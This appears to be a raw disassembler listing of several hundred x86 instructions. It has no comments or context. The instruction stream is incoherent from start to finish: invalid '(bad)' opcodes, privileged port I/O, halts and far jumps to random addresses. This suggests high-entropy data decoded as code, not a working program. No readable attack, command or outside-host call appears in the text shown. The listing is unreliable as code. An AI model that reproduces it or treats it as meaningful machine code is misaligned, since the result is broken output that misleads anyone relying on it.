  4171ca:	ins    DWORD PTR es:[edi],dx
  4171cb:	or     al,bh
  4171cd:	ss mov eax,0xb5175110
  4171d3:	xor    BYTE PTR [edx+0x7cd01a55],bl
  4171d9:	loope  0x4171a5
  4171db:	xor    al,0x4d
  4171dd:	mov    dh,0xae
  4171df:	mov    edi,0xde84c276
  4171e4:	mov    ebx,0x268bb4e8
  4171e9:	dec    ecx
  4171ea:	(bad)  
  4171eb:	aad    0xec
  4171ed:	cmp    BYTE PTR ds:0x5c41bdfd,dl
  4171f3:	push   ebx
  4171f4:	pop    ebp
  4171f5:	ficom  WORD PTR [edx+0x1cc909b2]
  4171fb:	(bad)  
  4171fe:	xchg   ecx,eax
  4171ff:	xchg   ebp,eax
  417200:	in     eax,0x7
  417202:	int3   
  417203:	sti    
  417204:	out    0x4d,eax
  417206:	neg    BYTE PTR [edx]
  417208:	sbb    DWORD PTR [ebx-0x40a5171e],ebx
  41720e:	hlt    
  41720f:	adc    eax,0x10f29a8a
  417214:	or     eax,0x4538bf2
  417219:	or     BYTE PTR [ebx-0x5],ch
  41721c:	out    dx,al
  41721d:	aas    
  41721e:	fcomp  QWORD PTR [edi+0x222bd9f5]
  417224:	push   edi
  417225:	jmp    0xa98b:0xad9adf6f
  41722c:	fs pop edx
  41722e:	adc    ecx,DWORD PTR [edx]
  417230:	js     0x417249
  417232:	shl    BYTE PTR cs:[eax+ecx*1-0x23],cl
  417237:	imul   DWORD PTR [ebp-0x61]
  41723a:	pop    ebx
  41723b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41723c:	mov    bh,0xb3
  41723e:	fcomp  st(0)
  417240:	mov    al,0x92
  417242:	sar    esp,0x30
  417245:	test   al,0x20
  417247:	mov    edi,0xb20a31a2
  41724c:	sbb    BYTE PTR [edx-0x4f],al
  41724f:	mov    ebp,0x9be4876e
  417254:	xor    al,0xbb
  417256:	pushf  
  417257:	out    dx,al
  417258:	mov    ah,0x91
  41725a:	leave  
  41725b:	push   ebx
  41725c:	dec    ecx
  41725d:	call   0x1ddb3ea9
  417262:	xchg   esp,eax
  417263:	or     DWORD PTR ds:0x41c9dc68,0xfffffffd
  41726a:	(bad)  
  41726b:	das    
  41726c:	dec    ecx
  41726d:	stos   BYTE PTR es:[edi],al
  41726e:	loope  0x41728e
  417270:	mov    ecx,edi
  417272:	jns    0x4172aa
  417274:	cwde   
  417275:	mov    al,ds:0x761186a5
  41727a:	jmp    0xaf0d:0xdc172070
  417281:	retf   0xa1d7
  417284:	test   eax,0xbe0f08fd
  417289:	pop    esi
  41728a:	daa    
  41728b:	add    al,BYTE PTR [ebx+0x3f1b4bfd]
  417291:	mov    dl,dl
  417293:	icebp  
  417294:	mov    bh,0x36
  417296:	xchg   edx,eax
  417297:	in     eax,0xd3
  417299:	dec    esp
  41729a:	xor    al,0x1d
  41729c:	jbe    0x4172ca
  41729e:	loopne 0x4172b6
  4172a0:	js     0x4172a3
  4172a2:	daa    
  4172a3:	jmp    0xb184:0xe88db6f5
  4172aa:	push   ds
  4172ab:	out    dx,al
  4172ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4172ad:	test   al,0x74
  4172af:	rcl    DWORD PTR [eax+edx*2],cl
  4172b2:	retf   
  4172b3:	add    eax,0x5918bee3
  4172b8:	ss xor al,0x89
  4172bb:	and    bl,ah
  4172bd:	xchg   ebx,eax
  4172be:	adc    DWORD PTR [ecx],edi
  4172c0:	inc    ebx
  4172c1:	push   cs
  4172c2:	(bad)
  4172c7:	cmp    ah,BYTE PTR [ebp-0x17b3270f]
  4172cd:	jnp    0x417288
  4172cf:	repnz xor BYTE PTR [ebp-0x5c],dl
  4172d3:	sar    BYTE PTR [edi],cl
  4172d5:	ja     0x417282
  4172d7:	ja     0x4172c9
  4172d9:	js     0x417266
  4172db:	sbb    al,0xa4
  4172dd:	xlat   BYTE PTR ds:[ebx]
  4172de:	push   edx
  4172df:	mov    ebp,0x15bb55c8
  4172e4:	or     DWORD PTR [ecx+ecx*2-0x1dabe97e],ebp
  4172eb:	or     cl,BYTE PTR [edx+ebx*2]
  4172ee:	pop    edi
  4172ef:	sub    ch,0xb2
  4172f2:	mov    edi,0x3a2e1597
  4172f7:	lock pop ecx
  4172f9:	lea    edx,[esi-0x76f87ed3]
  4172ff:	mov    ds:0xb9f39497,eax
  417304:	push   es
  417305:	stc    
  417306:	lods   al,BYTE PTR ds:[esi]
  417307:	inc    ebp
  417308:	mov    ?,edi
  41730a:	aad    0x9c
  41730c:	pusha  
  41730d:	nop
  41730e:	int3   
  41730f:	and    eax,0xea07d5de
  417314:	pushf  
  417315:	mov    esp,0x25556225
  41731a:	sub    DWORD PTR [edx+0x77],0xffffffbf
  41731e:	push   ss
  41731f:	in     al,dx
  417320:	ret    
  417321:	je     0x4172b2
  417323:	push   ebx
  417324:	call   0xc3032c35
  417329:	cmp    bl,BYTE PTR [ebx+esi*4+0x65]
  41732d:	cwde   
  41732e:	push   ss
  41732f:	(bad)  
  417330:	fcomp  DWORD PTR ds:0x9c9a5ae
  417336:	les    ecx,FWORD PTR [ebx]
  417338:	mov    ah,0xcb
  41733a:	test   eax,0x3dc484c
  41733f:	out    dx,al
  417340:	mov    cl,0xa8
  417342:	das    
  417343:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417344:	hlt    
  417345:	cwde   
  417346:	fsubp  st(5),st
  417348:	out    0xfc,eax
  41734a:	mov    bh,0x74
  41734c:	lea    edi,ds:0xec213020
  417352:	lahf   
  417353:	stos   BYTE PTR es:[edi],al
  417354:	or     eax,0xb2ae7378
  417359:	xchg   esp,eax
  41735a:	(bad)  
  41735b:	jb     0x417340
  41735d:	pop    ebp
  41735e:	scas   eax,DWORD PTR es:[edi]
  41735f:	jns    0x417393
  417361:	push   0x2468b7f8
  417366:	(bad)  [ebx+esi*8+0x3d]
  41736a:	ds mov ch,0xff
  41736d:	dec    ebp
  41736e:	pop    ds
  41736f:	xchg   ebx,eax
  417370:	cmp    edi,0xe4857ca3
  417376:	xor    eax,0xe4429634
  41737b:	mov    al,ds:0x97c4cefb
  417380:	jns    0x417385
  417382:	mul    BYTE PTR [ebx+0x5b]
  417385:	ins    BYTE PTR es:[edi],dx
  417386:	cli    
  417387:	push   es
  417388:	lds    ecx,FWORD PTR es:[ebx]
  41738b:	ins    BYTE PTR es:[edi],dx
  41738c:	xor    DWORD PTR [ecx+0x4ec6e76d],edx
  417392:	sbb    eax,0x3e7da4f4
  417397:	and    edi,DWORD PTR [esi-0x3a]
  41739a:	cmp    ah,BYTE PTR [edi+0x4c]
  41739d:	cli    
  41739e:	es pop di
  4173a1:	xor    ch,BYTE PTR [ebx-0x21fd14fd]
  4173a7:	lods   al,BYTE PTR ds:[esi]
  4173a8:	sbb    BYTE PTR [ecx-0x50204db7],al
  4173ae:	repnz xor eax,0xa2401192
  4173b4:	mov    ebp,0x9818fdea
  4173b9:	mov    edx,0xf4ae662f
  4173be:	adc    ecx,DWORD PTR [ecx+0x1a]
  4173c1:	les    edx,FWORD PTR [esp+eiz*4+0x55]
  4173c5:	int    0x22
  4173c7:	and    edi,DWORD PTR [ebx]
  4173c9:	scas   al,BYTE PTR es:[edi]
  4173ca:	(bad)
  4173cd:	lods   al,BYTE PTR ds:[esi]
  4173ce:	enter  0x5f31,0x82
  4173d2:	and    eax,0x86adb599
  4173d7:	inc    ebp
  4173d8:	mov    ecx,0x9fb00b5d
  4173dd:	xchg   eax,ebp
  4173df:	ja     0x41738f
  4173e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4173e2:	sbb    dl,BYTE PTR [edx+0x448a839]
  4173e8:	test   eax,0x8825ab6
  4173ed:	cmp    DWORD PTR [edi+eax*2],0xffffff92
  4173f1:	push   ecx
  4173f2:	(bad)  
  4173f3:	loope  0x41743c
  4173f5:	outs   dx,BYTE PTR ds:[esi]
  4173f6:	je     0x41743a
  4173f8:	xor    DWORD PTR [edi],ecx
  4173fa:	xor    BYTE PTR [eax-0x21],0xf9
  4173fe:	mov    esp,0x517a3844
  417403:	aas    
  417404:	mov    ds:0xd8b338c3,al
  417409:	mul    BYTE PTR [esi+0x69825e49]
  41740f:	in     al,0x34
  417411:	lds    ecx,FWORD PTR [eax+0x19ca3bb8]
  417417:	xchg   esi,eax
  417418:	push   0x74
  41741a:	dec    ebx
  41741b:	sub    dh,BYTE PTR [edx-0xdcf66e9]
  417421:	std    
  417422:	adc    BYTE PTR [ebx+0x6fe7fa0b],ah
  417428:	in     al,0x74
  41742a:	mov    ecx,0x3b64beb7
  41742f:	lahf   
  417430:	lds    esp,FWORD PTR [eax+0x6fa1be25]
  417436:	loop   0x4173be
  417438:	jb     0x4173ec
  41743a:	sbb    eax,0xed100b33
  41743f:	jne    0x41741b
  417441:	lahf   
  417442:	adc    BYTE PTR [eax-0x70],ah
  417445:	in     eax,dx
  417446:	push   ebp
  417447:	lods   eax,DWORD PTR ds:[esi]
  417448:	mov    al,dh
  41744a:	ins    BYTE PTR es:[edi],dx
  41744b:	cmp    eax,0xded812aa
  417450:	inc    ebx
  417451:	xchg   edx,eax
  417452:	mov    al,ds:0x7baea567
  417457:	popa   
  417458:	les    esi,FWORD PTR [ebp+0x57]
  41745b:	sub    DWORD PTR [ecx-0x7],ebx
  41745e:	dec    edi
  41745f:	ja     0x417495
  417461:	in     eax,dx
  417462:	cmp    DWORD PTR [edi-0x26944376],ebp
  417468:	and    dh,BYTE PTR [edx-0x39d8c5b8]
  41746e:	push   edi
  41746f:	jge    0x4174a9
  417471:	fsubrp st(7),st
  417473:	daa    
  417474:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417475:	sbb    BYTE PTR [esi+edx*4+0x74],dh
  417479:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41747a:	or     DWORD PTR [edx+0x2],ecx
  41747d:	loope  0x417460
  41747f:	aas    
  417480:	je     0x417500
  417482:	mov    di,0x44e
  417486:	mov    cl,0x8f
  417488:	js     0x417456
  41748a:	sbb    eax,0x664f51da
  41748f:	popf   
  417490:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417491:	dec    edi
  417492:	or     DWORD PTR [edi+0x12e7719d],0xb
  417499:	stos   BYTE PTR es:[edi],al
  41749a:	(bad)  
  41749b:	mov    ch,dl
  41749d:	add    al,0x1f
  41749f:	sti    
  4174a0:	mov    esi,0xfea582c
  4174a5:	xor    al,0x3
  4174a7:	fsub   QWORD PTR [esi]
  4174a9:	push   edi
  4174aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4174ab:	call   0x80b53153
  4174b0:	scas   al,BYTE PTR es:[edi]
  4174b1:	les    eax,FWORD PTR [esi-0x11]
  4174b4:	push   ecx
  4174b5:	clc    
  4174b6:	mov    dh,BYTE PTR [edx-0x4cd1327e]
  4174bc:	sub    ebx,DWORD PTR [ebx+0x6e]
  4174bf:	adc    eax,0xffffffec
  4174c2:	das    
  4174c3:	mov    esp,ebp
  4174c5:	jnp    0x4174b1
  4174c7:	pop    edi
  4174c8:	mov    ebp,0xfac77057
  4174cd:	cld    
  4174ce:	sub    BYTE PTR [ecx+0x2c],dl
  4174d1:	mov    eax,0xed1980b9
  4174d6:	and    ecx,DWORD PTR [esi+ebp*1+0x22]
  4174da:	icebp  
  4174db:	ins    BYTE PTR es:[edi],dx
  4174dc:	call   0xfa55:0xc42cd9f1
  4174e3:	mov    cl,0xac
  4174e5:	shr    bl,0x17
  4174e8:	popa   
  4174e9:	mov    bl,0x48
  4174eb:	adc    eax,0xa2f3aeb5
  4174f0:	pop    edx
  4174f1:	add    esp,DWORD PTR [ebx+0x666d35f9]
  4174f7:	sub    al,dl
  4174f9:	mov    ch,0xd1
  4174fb:	fadd   DWORD PTR [ebp+0x52]
  4174fe:	inc    ecx
  4174ff:	and    DWORD PTR [ebp-0x30],ebp
  417502:	mov    ds:0xb6edd137,al
  417507:	in     eax,dx
  417508:	cwde   
  417509:	pushf  
  41750a:	or     BYTE PTR ds:0x3d7d163,bh
  417510:	pop    edi
  417511:	pop    DWORD PTR [edi]
  417513:	(bad)  
  417514:	mov    dh,BYTE PTR [di-0x75]
  417518:	out    0xe2,al
  41751a:	js     0x4174b4
  41751c:	jne    0x4174dc
  41751e:	fisttp QWORD PTR [ebx]
  417520:	xchg   BYTE PTR [ebp+0xd],bh
  417523:	add    bh,al
  417525:	retf   
  417526:	lds    ebp,FWORD PTR [esi]
  417528:	daa    
  417529:	out    0xc5,al
  41752b:	jns    0x4174bb
  41752d:	ror    dl,cl
  41752f:	cs fs loope 0x4174fb
  417533:	adc    BYTE PTR [ebx-0x62],bh
  417536:	pushf  
  417537:	mov    edx,0xd64a0fd5
  41753c:	and    dl,BYTE PTR [edx-0x50]
  41753f:	call   FWORD PTR [edi-0x23]
  417542:	inc    edx
  417543:	mov    ah,0xec
  417545:	jmp    0x624a:0xc1f4ccc2
  41754c:	pushf  
  41754d:	and    eax,0xdc717929
  417552:	(bad)  
  417553:	cli    
  417554:	loope  0x41756e
  417556:	dec    ebp
  417557:	ror    DWORD PTR [esi],0x29
  41755a:	sbb    al,0xbc
  41755c:	dec    ecx
  41755d:	loope  0x41750a
  41755f:	rol    BYTE PTR [esi-0x21],0x8b
  417563:	cwde   
  417564:	push   eax
  417565:	push   0x96e454b9
  41756a:	je     0x417505
  41756c:	cmp    dh,BYTE PTR [edx]
  41756e:	mov    DWORD PTR [edx],edx
  417570:	mul    dl
  417572:	vpslld ymm7,ymm6,XMMWORD PTR [eax+0x34015135]
  41757a:	mov    bl,BYTE PTR [edi-0x5d]
  41757d:	out    dx,eax
  41757e:	xchg   DWORD PTR [ebx+0x76002ef8],ebx
  417584:	sub    eax,0xa34983e2
  417589:	push   eax
  41758a:	inc    ebx
  41758b:	sub    eax,0x6fa06776
  417590:	mov    ecx,0x96b75543
  417595:	mov    al,0xcd
  417597:	xchg   esi,ecx
  417599:	sub    al,0x27
  41759b:	jne    0x417608
  41759d:	adc    al,0x72
  41759f:	jne    0x417562
  4175a1:	fwait
  4175a2:	jp     0x417584
  4175a4:	sbb    eax,0xbc36e98f
  4175a9:	jnp    0x417600
  4175ab:	inc    ebx
  4175ac:	xchg   ebp,eax
  4175ad:	push   ebp
  4175ae:	xchg   esi,eax
  4175af:	adc    dh,BYTE PTR [eax*8+0x76e78427]
  4175b6:	mov    edx,0x3d6d75d5
  4175bb:	mov    ecx,0xaff4a35c
  4175c0:	cmp    esp,DWORD PTR [ebx+0xd2a2db1]
  4175c6:	fst    st(2)
  4175c8:	pusha  
  4175c9:	or     BYTE PTR ss:[ebp+0x1c],ch
  4175cd:	pop    ss
  4175ce:	lahf   
  4175cf:	sbb    ah,BYTE PTR [ebx]
  4175d1:	inc    edx
  4175d2:	inc    esi
  4175d3:	cs dec esi
  4175d5:	lds    ebp,FWORD PTR [eax+0x44]
  4175d8:	dec    ecx
  4175d9:	ret    0x7949
  4175dc:	jbe    0x41761c
  4175de:	pop    ebx
  4175df:	out    0xf3,al
  4175e1:	jge    0x41765a
  4175e3:	mov    esi,0x3f55d1f1
  4175e8:	call   0xc01466e6
  4175ed:	pop    eax
  4175ee:	mov    ah,0x1d
  4175f0:	jecxz  0x417631
  4175f2:	adc    cl,bl
  4175f4:	add    bh,dh
  4175f6:	sbb    ch,dl
  4175f8:	jo     0x41759e
  4175fa:	cld    
  4175fb:	push   edx
  4175fc:	mov    ah,BYTE PTR [ecx-0x6fe4d5d]
  417602:	jmp    0x417648
  417604:	and    al,BYTE PTR [ecx-0x15]
  417607:	xchg   edx,eax
  417608:	sub    al,0x6d
  41760a:	push   0x312e3bae
  41760f:	enter  0xef5c,0xd5
  417613:	mov    cl,0xae
  417615:	mov    edx,0xd0882c70
  41761a:	sar    DWORD PTR [eax-0x3f1c3fcf],1
  417620:	dec    ecx
  417621:	pop    esi
  417622:	add    al,0x78
  417624:	adc    DWORD PTR [ebp+0x16a33963],eax
  41762a:	or     DWORD PTR [ecx-0x23],0xffffffe9
  41762e:	shl    DWORD PTR [ebp-0x68faf715],cl
  417634:	pop    edi
  417635:	shl    DWORD PTR [ecx],1
  417637:	inc    edx
  417638:	retf   0x2b4d
  41763b:	ins    BYTE PTR es:[edi],dx
  41763c:	mov    al,ds:0xa5d2abb7
  417641:	sbb    edx,DWORD PTR [eax]
  417643:	popa   
  417644:	sub    ah,0x9
  417647:	imul   eax,DWORD PTR [edi-0x6682f6a0],0xfffffff7
  41764e:	xchg   edx,eax
  41764f:	loop   0x417638
  417651:	or     ch,bl
  417653:	xor    DWORD PTR [ebp+0x25],edx
  417656:	stc    
  417657:	sbb    eax,esp
  417659:	call   0x3311:0xdb2382ec
  417660:	mov    DWORD PTR [esi+0x2dcf74],esi
  417666:	xor    DWORD PTR [ebp+0x56b027a8],ebp
  41766c:	cmp    ebx,DWORD PTR [ebp+0x3b8ef39b]
  417672:	outs   dx,DWORD PTR ds:[esi]
  417673:	cmp    eax,0x4f0aa484
  417678:	repnz inc edi
  41767a:	adc    eax,0xb6e8b4d3
  41767f:	loopne 0x41764b
  417681:	pop    ds
  417682:	mov    WORD PTR [eax+0xf352ce3],ds
  417688:	jp     0x417632
  41768a:	fst    DWORD PTR [ebx+edi*4+0x18310ecc]
  417691:	push   0x59df7737
  417696:	jmp    0x4176bd
  417698:	pop    ebp
  417699:	cli    
  41769a:	and    al,0x28
  41769c:	inc    edx
  41769d:	out    dx,al
  41769e:	jg     0x4176f4
  4176a0:	push   0x7f
  4176a2:	(bad)  
  4176a3:	mov    ecx,0x261be681
  4176a8:	(bad)  
  4176aa:	sbb    BYTE PTR [ebx-0x31],bh
  4176ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4176ae:	ret    
  4176af:	clc    
  4176b0:	push   cs
  4176b1:	cmp    BYTE PTR [edx-0x61],cl
  4176b4:	aas    
  4176b5:	les    esi,FWORD PTR [edx]
  4176b7:	(bad)  
  4176b8:	fnstenv [esi-0x59]
  4176bb:	xor    ch,BYTE PTR [ecx]
  4176bd:	dec    esp
  4176be:	sbb    eax,0x58ec6239
  4176c3:	(bad)  
  4176c4:	adc    BYTE PTR [ebx-0x3277bce5],bl
  4176ca:	int    0xd9
  4176cc:	push   edx
  4176cd:	out    0x59,al
  4176cf:	sub    DWORD PTR [esi],esp
  4176d1:	pop    esi
  4176d2:	sub    eax,0x4eaf8fe5
  4176d7:	enter  0xbbe4,0xb4
  4176db:	shl    edx,1
  4176dd:	out    dx,eax
  4176de:	mov    cl,0xee
  4176e0:	adc    al,0xab
  4176e2:	loopne 0x417680
  4176e4:	pop    es
  4176e5:	cmc    
  4176e6:	sbb    al,0x4f
  4176e8:	pop    es
  4176e9:	inc    ebp
  4176ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4176eb:	repnz in eax,0xca
  4176ee:	pop    ebp
  4176ef:	jecxz  0x41770d
  4176f1:	shl    DWORD PTR [esi+0x4d],1
  4176f4:	xchg   edx,eax
  4176f5:	test   al,0xb6
  4176f7:	je     0x417683
  4176f9:	mov    DWORD PTR [ebp+edi*8-0x6e],0x72d07551
  417701:	pop    esi
  417702:	xchg   ecx,eax
  417703:	adc    ebx,DWORD PTR [edi]
  417705:	in     eax,0x60
  417707:	bound  edi,QWORD PTR [esi]
  417709:	sub    DWORD PTR [eax+0x68],0x57b2ec36
  417710:	add    eax,0x316fe73c
  417715:	icebp  
  417716:	in     al,0x67
  417718:	stc    
  417719:	or     BYTE PTR [ecx],bl
  41771b:	jge    0x4176cd
  41771d:	ja     0x417723
  41771f:	adc    bl,BYTE PTR [eax]
  417721:	jp     0x417717
  417723:	and    BYTE PTR [ebx+ebx*4],0x56
  417727:	iret   
  417728:	test   DWORD PTR [edi+0x4b],esp
  41772b:	push   0x88d6358e
  417730:	sbb    edi,DWORD PTR [edi-0x6bc25a4]
  417736:	cmp    ebx,DWORD PTR [eax+0x2e]
  417739:	retf   0x1fa0
  41773c:	repnz adc ah,BYTE PTR [ecx-0x23]
  417740:	jl     0x417770
  417742:	push   ebx
  417743:	jns    0x41773c
  417745:	popa   
  417746:	je     0x417721
  417748:	pop    edx
  417749:	xchg   ebx,eax
  41774a:	int    0xf6
  41774c:	ds xor al,0xd5
  41774f:	adc    eax,0x4ce3868
  417754:	bound  ecx,QWORD PTR [esi+ecx*8-0x1f]
  417758:	fnsave [eax]
  41775a:	adc    ecx,DWORD PTR [edx+ebp*4+0x7483e58b]
  417761:	push   0x19
  417763:	inc    esi
  417764:	repz xor eax,0x532648c7
  41776a:	in     eax,0x7e
  41776c:	stos   BYTE PTR es:[edi],al
  41776d:	pusha  
  41776e:	xacquire xchg DWORD PTR [esi-0x6c],ebx
  417772:	xor    ebp,DWORD PTR [esi]
  417774:	jnp    0x417726
  417776:	inc    edi
  417777:	arpl   sp,sp
  417779:	sub    al,0xc9
  41777b:	sbb    BYTE PTR [eax+ebp*2],ah
  41777e:	pop    edi
  41777f:	push   ecx
  417780:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417781:	jbe    0x4177ff
  417783:	sti    
  417784:	and    al,0x41
  417786:	xor    edx,DWORD PTR [ebx+0x643f92a8]
  41778c:	sub    DWORD PTR [eax],0x42c214d2
  417792:	sbb    BYTE PTR [edx],0xe5
  417795:	xor    bl,BYTE PTR [edi-0x4cf8cd4a]
  41779b:	mov    esp,0x556946b
  4177a0:	rol    DWORD PTR [esi-0x443e70dc],cl
  4177a6:	sbb    al,0x4a
  4177a8:	lea    ecx,[ecx-0x2d]
  4177ab:	cli    
  4177ac:	jl     0x417773
  4177ae:	cmp    ah,BYTE PTR [esi]
  4177b0:	pushf  
  4177b1:	mov    al,0x56
  4177b3:	ss es sub al,0x3c
  4177b7:	and    al,BYTE PTR [eax+0x52f1775e]
  4177bd:	sub    al,0x2e
  4177bf:	sbb    ah,bh
  4177c1:	repnz dec BYTE PTR [ecx+0x1e]
  4177c5:	cmp    ah,bl
  4177c7:	xchg   esp,eax
  4177c8:	stos   DWORD PTR es:[edi],eax
  4177c9:	fidivr WORD PTR [ebx-0x21]
  4177cc:	(bad)  
  4177cd:	mov    al,0x0
  4177cf:	jo     0x417759
  4177d1:	ins    BYTE PTR es:[edi],dx
  4177d2:	dec    esi
  4177d3:	frstor [ecx+0x1f]
  4177d6:	mov    eax,ds:0xac081eb3
  4177db:	mov    esi,0x1db2966a
  4177e0:	rsqrtps xmm3,XMMWORD PTR [ebp-0x37]
  4177e4:	xlat   BYTE PTR ss:[ebx]
  4177e6:	loop   0x4177c0
  4177e8:	idiv   DWORD PTR [esi+0x747e3a42]
  4177ee:	jp     0x4177f5
  4177f0:	mov    cl,0xd2
  4177f2:	and    BYTE PTR [ebp-0x14ba9939],0x2f
  4177f9:	pop    edi
  4177fa:	ja     0x41778c
  4177fc:	xchg   ecx,esi
  4177fe:	test   al,0x89
  417800:	aaa    
  417801:	aas    
  417802:	out    dx,al
  417803:	dec    ebp
  417804:	es jne 0x41782c
  417807:	outs   dx,DWORD PTR ds:[esi]
  417808:	adc    BYTE PTR [esi],al
  41780a:	mov    ecx,0xe6e2ea79
  41780f:	call   0xcf8f:0xbc83914e
  417816:	pop    es
  417817:	mov    eax,0xc2b6fb9e
  41781c:	in     al,dx
  41781d:	jecxz  0x41783b
  41781f:	cmp    edi,DWORD PTR [ebx+0xf]
  417822:	jge    0x417818
  417824:	cmp    BYTE PTR [ebp+0x3f60ea92],cl
  41782a:	adc    bh,cl
  41782c:	inc    eax
  41782d:	ret    
  41782e:	out    dx,al
  41782f:	xor    ecx,DWORD PTR [ecx-0x4aadcc4b]
  417835:	stos   BYTE PTR es:[edi],al
  417836:	es inc ebx
  417838:	sub    cl,BYTE PTR [ebp-0xa]
  41783b:	push   cs
  41783c:	ins    DWORD PTR es:[edi],dx
  41783d:	add    BYTE PTR ds:0x3d604bc1,cl
  417843:	retf   0x3945
  417846:	mov    eax,0x1552d10e
  41784b:	sbb    al,0x4
  41784d:	(bad)  [ecx-0x44f576c1]
  417853:	fst    QWORD PTR [esi]
  417855:	sub    edx,DWORD PTR [ebx-0x2f]
  417858:	pop    es
  417859:	nop
  41785a:	push   edx
  41785b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41785c:	in     eax,dx
  41785d:	push   ss
  41785e:	inc    esp
  41785f:	xchg   edx,eax
  417860:	les    ebp,FWORD PTR [ecx+0x1ad4fb81]
  417866:	jp     0x4177f4
  417868:	push   eax
  417869:	sub    DWORD PTR [edi+ebp*1],eax
  41786c:	aad    0xc7
  41786e:	arpl   dx,si
  417870:	pop    esi
  417871:	and    esp,DWORD PTR [edx-0x17]
  417874:	rcr    ch,0x7b
  417877:	push   ecx
  417878:	jb     0x41789b
  41787a:	test   al,0x6e
  41787c:	push   eax
  41787d:	rol    bl,cl
  41787f:	std    
  417880:	aam    0x19
  417882:	mov    cl,0xc7
  417884:	mov    cs,WORD PTR [eax]
  417886:	jo     0x4178f7
  417888:	out    0xb,eax
  41788a:	push   edx
  41788b:	cmp    BYTE PTR [esi],0x5b
  41788e:	xchg   ebp,eax
  41788f:	out    dx,al
  417890:	imul   esi,DWORD PTR [ecx-0x53],0x12
  417894:	leave  
  417895:	jecxz  0x4178a5
  417897:	xchg   ecx,eax
  417898:	xchg   edx,eax
  417899:	aam    0x17
  41789b:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41789d:	scas   al,BYTE PTR es:[edi]
  41789e:	std    
  41789f:	cld    
  4178a0:	jle    0x417889
  4178a2:	fyl2x  
  4178a4:	repz fstp TBYTE PTR [eax-0x4b]
  4178a8:	in     eax,dx
  4178a9:	lsl    edi,WORD PTR [esi-0x6bd0ae6a]
  4178b0:	sub    ch,bh
  4178b2:	sti    
  4178b3:	xor    cl,ch
  4178b5:	jbe    0x4178d1
  4178b7:	aam    0x14
  4178b9:	sar    DWORD PTR [ebp-0x27],1
  4178bc:	and    bh,0x4f
  4178bf:	pop    esp
  4178c0:	jmp    0x6d45:0x26fc600d
  4178c7:	xlat   BYTE PTR ds:[ebx]
  4178c8:	add    DWORD PTR [edx+eax*8-0x4c],ebx
  4178cc:	ds jb  0x417893
  4178cf:	ins    BYTE PTR es:[edi],dx
  4178d0:	test   BYTE PTR [edx],bh
  4178d2:	repnz mov DWORD PTR [edx-0x16],edx
  4178d6:	stos   DWORD PTR es:[edi],eax
  4178d7:	arpl   WORD PTR [ebp-0x69],si
  4178da:	int3   
  4178db:	ss je  0x4178c5
  4178de:	cli    
  4178df:	lahf   
  4178e0:	int    0xb5
  4178e2:	lds    edx,FWORD PTR [edi+0xa2497fc]
  4178e8:	sub    ch,dl
  4178ea:	out    dx,al
  4178eb:	cwde   
  4178ec:	xchg   BYTE PTR [esi],bl
  4178ee:	js     0x417961
  4178f0:	xor    bl,dh
  4178f2:	or     al,0x94
  4178f4:	stos   DWORD PTR es:[edi],eax
  4178f5:	aas    
  4178f6:	das    
  4178f7:	cwde   
  4178f8:	cdq    
  4178f9:	enter  0x2535,0xae
  4178fd:	xchg   ebx,esp
  4178ff:	xchg   edi,eax
  417900:	jp     0x4178fc
  417902:	shr    BYTE PTR [edx],0xf0
  417905:	push   ecx
  417906:	push   ecx
  417907:	(bad)  
  417908:	push   ecx
  417909:	xchg   esp,eax
  41790a:	icebp  
  41790b:	inc    eax
  41790c:	jmpw   0x967e
  417910:	mov    eax,ds:0x3eebb608
  417915:	pop    edx
  417916:	mov    ah,0x61
  417918:	xor    BYTE PTR [edi-0x2],0x69
  41791c:	push   0x61
  41791e:	popa   
  41791f:	sbb    DWORD PTR [edx+0x12191fc4],edi
  417925:	rol    ecx,1
  417927:	adc    ch,bh
  417929:	xor    eax,0xc98e64eb
  41792e:	(bad)  
  41792f:	inc    esi
  417930:	std    
  417931:	jl     0x4179aa
  417933:	or     ch,BYTE PTR fs:[edi+0x59]
  417937:	push   eax
  417938:	and    BYTE PTR [edi-0x5c06ad3a],bl
  41793e:	pop    ds
  41793f:	pop    eax
  417940:	rcl    DWORD PTR [edi],0x86
  417943:	pop    esi
  417944:	push   ds
  417945:	daa    
  417946:	dec    ecx
  417947:	stos   DWORD PTR es:[edi],eax
  417948:	xchg   ecx,eax
  417949:	mov    eax,?
  41794b:	loope  0x417940
  41794d:	dec    edx
  41794e:	sbb    DWORD PTR [edx-0x4c],ebx
  417951:	jmp    0x9053bc09
  417956:	cld    
  417957:	unpcklps xmm2,xmm4
  41795a:	call   0x5842:0x413e4ff1
  417961:	hlt    
  417962:	pushf  
  417963:	sub    BYTE PTR [edi-0x5d],cl
  417966:	in     al,dx
  417967:	out    dx,al
  417968:	clc    
  417969:	adc    bl,BYTE PTR [ebp+0x1eb0cbdd]
  41796f:	js     0x4179e1
  417971:	fcomp  DWORD PTR [ebp+edx*2-0x417db558]
  417978:	add    DWORD PTR [eax+ebx*8],ebx
  41797b:	sub    BYTE PTR ds:0xaa73b73c,0xb0
  417982:	push   ebx
  417983:	xchg   eax,esp
  417985:	inc    esp
  417986:	jb     0x4179a2
  417988:	mov    esi,0xc40bc606
  41798d:	(bad)  [ecx]
  41798f:	jp     0x417919
  417991:	sub    ebp,esi
  417993:	xchg   edx,eax
  417994:	outs   dx,DWORD PTR ds:[esi]
  417995:	and    esi,DWORD PTR [ebx]
  417997:	mov    DWORD PTR [ebx-0x706fcc58],esi
  41799d:	dec    ecx
  41799e:	arpl   di,bx
  4179a0:	in     al,0x6f
  4179a2:	fisub  WORD PTR ds:0xa397f903
  4179a8:	jbe    0x417980
  4179aa:	js     0x4179c7
  4179ac:	mov    ebx,0x38234b9e
  4179b1:	xchg   edi,eax
  4179b2:	loopne 0x417976
  4179b4:	pop    edi
